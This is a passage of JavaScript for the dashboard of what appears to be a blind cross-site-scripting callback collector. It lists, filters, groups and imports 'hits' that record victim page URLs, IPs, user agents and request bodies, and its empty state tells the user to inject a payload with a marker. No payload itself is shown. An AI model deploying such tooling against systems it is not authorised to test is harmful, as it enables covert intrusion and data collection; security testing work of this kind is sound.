      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      });

      if (response.status === 401) {
        location.href = "/login";
        return { callbacks: [] };
      }

      return response.json();
    }

    async function previewImportFile() {
      const file = importFileEl.files && importFileEl.files[0];
      if (!file) {
        importPreviewEl.textContent = "Choose a JSONL or JSON file first.";
        return;
      }

      const text = await file.text();
      importPreviewEntries = parseImportText(text);
      if (!importPreviewEntries.length) {
        importPreviewEl.textContent = "No valid hit entries found in this file.";
        return;
      }

      const groups = groupCallbacks(importPreviewEntries);
      importPreviewEl.innerHTML = "<strong>" + importPreviewEntries.length + " hits ready to preview.</strong><br>" +
        groups.slice(0, 8).map((group) => escapeHtml(group.label) + " (" + group.hits.length + " hits)").join("<br>") +
        (groups.length > 8 ? "<br>..." : "");
    }

    async function appendImportFile() {
      if (!importPreviewEntries.length) {
        await previewImportFile();
      }

      if (!importPreviewEntries.length) {
        return;
      }

      if (!confirm("Add " + importPreviewEntries.length + " imported hits to the current logs?")) {
        return;
      }

      const data = await postJson("/api/callbacks/import", { entries: importPreviewEntries });
      allCallbacks = data.callbacks || [];
      importPreviewEl.textContent = "Imported " + (data.imported || 0) + " hits.";
      importPreviewEntries = [];
      renderCallbacks(allCallbacks);
      updateSuggestions(allCallbacks);
    }

    function parseImportText(text) {
      try {
        const parsed = JSON.parse(text);
        if (Array.isArray(parsed)) {
          return parsed.map(normalizeImportEntry).filter(Boolean);
        }
        if (Array.isArray(parsed.callbacks)) {
          return parsed.callbacks.map(normalizeImportEntry).filter(Boolean);
        }
      } catch (_) {}

      return text.split(/\\r?\\n/)
        .map((line) => line.trim())
        .filter(Boolean)
        .map((line) => {
          try {
            return normalizeImportEntry(JSON.parse(line));
          } catch {
            return null;
          }
        })
        .filter(Boolean);
    }

    function normalizeImportEntry(entry) {
      if (!entry || typeof entry !== "object") {
        return null;
      }

      return {
        receivedAt: entry.receivedAt || new Date().toISOString(),
        ip: entry.ip || "",
        marker: entry.marker || "unknown",
        pageUrl: entry.pageUrl || "",
        referrer: entry.referrer || "",
        userAgent: entry.userAgent || "",
        language: entry.language || "",
        viewport: entry.viewport || "",
        source: entry.source || "import"
      };
    }

    function renderCallbacks(callbacks) {
      const filtered = applyFilters(callbacks);
      const groups = groupCallbacks(filtered);
      const selected = activeGroupKey && groups.find((group) => group.key === activeGroupKey)
        ? groups.find((group) => group.key === activeGroupKey)
        : groups[0];

      if (selected) {
        activeGroupKey = selected.key;
      }

      totalEl.textContent = filtered.length;
      uniqueEl.textContent = new Set(filtered.map((item) => item.marker).filter(Boolean)).size;
      renderGroups(groups, selected && selected.key);

      if (!filtered.length) {
        detailsTitleEl.textContent = "Hit Details";
        groupsEl.innerHTML = '<div class="empty">No matching hits.</div>';
        callbacksEl.innerHTML = '<div class="empty">No callbacks yet. Inject a payload with a unique marker and this table will update.</div>';
        return;
      }

      const detailHits = selected ? selected.hits : filtered;
      detailsTitleEl.textContent = selected ? selected.label + " (" + selected.hits.length + " hits)" : "Hit Details";

      const rows = detailHits.map((item) => {
        const pageDisplay = item.pageUrl || item.referrer || "";
        const bodyDisplay = item.rawBody ? '<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:120px;overflow-y:auto">' + escapeHtml(item.rawBody) + '</pre>' : '<span class="muted">—</span>';
        return '<tr>' +
          '<td><span class="marker">' + escapeHtml(item.marker || "unknown") + '</span><br><span class="muted">' + escapeHtml(formatTime(item.receivedAt)) + '</span></td>' +
          '<td>' + (pageDisplay ? linkify(pageDisplay) : '<span class="muted">—</span>') + '</td>' +
          '<td>' + escapeHtml(item.ip || "") + '</td>' +
          '<td>' + escapeHtml(item.userAgent || "") + '</td>' +
          '<td>' + escapeHtml(item.viewport || item.source || "") + '<br><span class="muted">' + escapeHtml(item.language || "") + '</span></td>' +
          '<td>' + bodyDisplay + '</td>' +
        '</tr>';
      }).join("");

      callbacksEl.innerHTML = '<table><thead><tr><th style="width: 180px;">Marker</th><th>Page URL</th><th style="width: 130px;">IP</th><th>User Agent</th><th style="width: 120px;">Client</th><th>Body</th></tr></thead><tbody>' + rows + '</tbody></table>';
    }

    function applyFilters(callbacks) {
      const page = filters.page.value.trim().toLowerCase();
      const ip = filters.ip.value.trim().toLowerCase();
      const marker = filters.marker.value.trim().toLowerCase();

      return callbacks.filter((item) => {
        const pageValue = pageKey(item).toLowerCase();
        const ipValue = String(item.ip || "").toLowerCase();
        const markerValue = String(item.marker || "").toLowerCase();

        return (!page || pageValue.includes(page)) &&
          (!ip || ipValue.includes(ip)) &&
          (!marker || markerValue.includes(marker));
      });
    }

    function groupCallbacks(callbacks) {
      const byPage = new Map();
      callbacks.forEach((item) => {
        const key = pageKey(item);
        if (!byPage.has(key)) {
          byPage.set(key, []);
        }
        byPage.get(key).push(item);
      });

      return Array.from(byPage.entries()).map(([key, hits]) => {
        const sortedHits = hits.slice().sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        const uniqueIps = new Set(sortedHits.map((item) => item.ip).filter(Boolean)).size;
        const uniqueMarkers = new Set(sortedHits.map((item) => item.marker).filter(Boolean)).size;
        return {
          key,
          label: pageLabel(key),
          hits: sortedHits,
          uniqueIps,
          uniqueMarkers,
          lastHit: sortedHits[0] && sortedHits[0].receivedAt
        };
      }).sort((a, b) => new Date(b.lastHit) - new Date(a.lastHit));
    }

    function renderGroups(groups, selectedKey) {
      if (!groups.length) {
        groupsEl.innerHTML = '<div class="empty">No matching pages.</div>';
        return;
      }

      groupsEl.innerHTML = groups.map((group) => {
        return '<div class="group-card' + (group.key === selectedKey ? ' active' : '') + '" data-key="' + escapeAttr(group.key) + '">' +
          '<button class="group-main" data-action="open" data-key="' + escapeAttr(group.key) + '">' +
          '<span class="group-title">' + escapeHtml(group.label) + '</span>' +
          '<span class="group-meta">Last hit ' + escapeHtml(formatTime(group.lastHit)) + ' &middot; ' +
          group.uniqueIps + ' IPs &middot; ' + group.uniqueMarkers + ' markers</span></button>' +
          '<span class="hit-count">' + group.hits.length + ' hits</span>' +
          '<button class="icon-button ghost" title="Page actions" data-action="menu" data-key="' + escapeAttr(group.key) + '">&vellip;</button>' +
          '<div class="menu" data-menu="' + escapeAttr(group.key) + '">' +
          '<button data-action="copy" data-key="' + escapeAttr(group.key) + '">Copy URL</button>' +
          '<button data-action="cut" data-key="' + escapeAttr(group.key) + '">Cut</button>' +
          '<button data-action="paste" data-key="' + escapeAttr(group.key) + '"' + (!cutPageKey || cutPageKey === group.key ? ' disabled' : '') + '>Paste here</button>' +
          '<button class="danger" data-action="delete" data-key="' + escapeAttr(group.key) + '">Delete</button>' +
          '</div>' +
        '</div>';
      }).join("");

      groupsEl.querySelectorAll('[data-action="open"]').forEach((button) => {
        button.addEventListener("click", () => {
          activeGroupKey = button.dataset.key;
          renderCallbacks(allCallbacks);
        });
      });
      groupsEl.querySelectorAll('[data-action="delete"]').forEach((button) => {
        button.addEventListener("click", async () => {
          const pageKey = button.dataset.key;
          if (!confirm("Delete all hits for this page URL?")) {
            return;
          }

          const data = await postJson("/api/callbacks/delete-page", { pageKey });
          allCallbacks = data.callbacks || [];
          activeGroupKey = "";
          renderCallbacks(allCallbacks);
          updateSuggestions(allCallbacks);
        });
      });
      groupsEl.querySelectorAll('[data-action="menu"]').forEach((button) => {
        button.addEventListener("click", (event) => {
          event.stopPropagation();
          const menu = findPageMenu(button.dataset.key);
          const shouldOpen = menu && !menu.classList.contains("open");
          closeMenus();
          if (shouldOpen) {
            const buttonRect = button.getBoundingClientRect();
            menu.classList.toggle("align-up", window.innerHeight - buttonRect.bottom < 180);
            button.closest(".group-card").classList.add("menu-active");
            menu.classList.add("open");
          }
        });
      });
      groupsEl.querySelectorAll('[data-action="copy"]').forEach((button) => {
        button.addEventListener("click", async () => {
          await navigator.clipboard.writeText(button.dataset.key);
          closeMenus();
        });
      });
      groupsEl.querySelectorAll('[data-action="cut"]').forEach((button) => {
        button.addEventListener("click", () => {
          cutPageKey = button.dataset.key;
          closeMenus();
          renderCallbacks(allCallbacks);
        });
      });
      groupsEl.querySelectorAll('[data-action="paste"]').forEach((button) => {
        button.addEventListener("click", async () => {
          if (!cutPageKey || cutPageKey === button.dataset.key) {
            return;
          }

          const data = await postJson("/api/callbacks/move-page", {
            sourcePageKey: cutPageKey,
            targetPageKey: button.dataset.key
          });
          allCallbacks = data.callbacks || [];
          activeGroupKey = button.dataset.key;
          cutPageKey = "";
          closeMenus();
          renderCallbacks(allCallbacks);
          updateSuggestions(allCallbacks);
        });
      });
    }

    function closeMenus() {
      groupsEl.querySelectorAll(".menu.open").forEach((menu) => {
        menu.classList.remove("open");
        menu.classList.remove("align-up");
      });
      groupsEl.querySelectorAll(".group-card.menu-active").forEach((card) => {
        card.classList.remove("menu-active");
      });
    }

    function updateSuggestions(callbacks) {
      const groups = groupCallbacks(callbacks);
      pageSuggestionsEl.innerHTML = groups.map((group) => {
        return '<option value="' + escapeAttr(group.key) + '">' + escapeHtml(group.label) + '</option>';
      }).join("");
      ipSuggestionsEl.innerHTML = Array.from(new Set(callbacks.map((item) => item.ip).filter(Boolean)))
        .sort()
        .map((ip) => '<option value="' + escapeAttr(ip) + '"></option>')
        .join("");
      markerSuggestionsEl.innerHTML = Array.from(new Set(callbacks.map((item) => item.marker).filter(Boolean)))
        .sort()
        .map((marker) => '<option value="' + escapeAttr(marker) + '"></option>')
        .join("");
    }

    function findPageMenu(pageKey) {
      return Array.from(groupsEl.querySelectorAll("[data-menu]")).find((menu) => menu.dataset.menu === pageKey);
    }

    function pageKey(item) {
      return String(item.pageUrl || item.referrer || "Unknown page");
    }

    function pageLabel(value) {
      if (value === "Unknown page") {
        return value;
      }

      try {
        const url = new URL(value);
        return url.hostname + (url.pathname === "/" ? "" : url.pathname);
      } catch {
        return value;
      }
    }

    function formatTime(value) {
      if (!value) return "";
      const date = new Date(value);
      return Number.isNaN(date.getTime()) ? value : date.toLocaleString();
    }

    function linkify(value) {
      if (!value) return "";
      const safe = escapeHtml(value);
      if (!/^https?:\\/\\//i.test(value)) return safe;
      return '<a href="' + safe + '" target="_blank" rel="noreferrer" style="color: var(--warn);">' + safe + '</a>';
    }

    function escapeHtml(value) {
      return String(value).replace(/[&<>"']/g, (char) => ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;"
      })[char]);
    }

    function escapeAttr(value) {
      return escapeHtml(value).replace(new RegExp(String.fromCharCode(96), "g"), "&#96;");
    }

    updatePayload();
    loadCallbacks();
    setInterval(loadCallbacks, 5000);
  </script>
</body>
</html>`;
}

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (char) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  })[char]);
}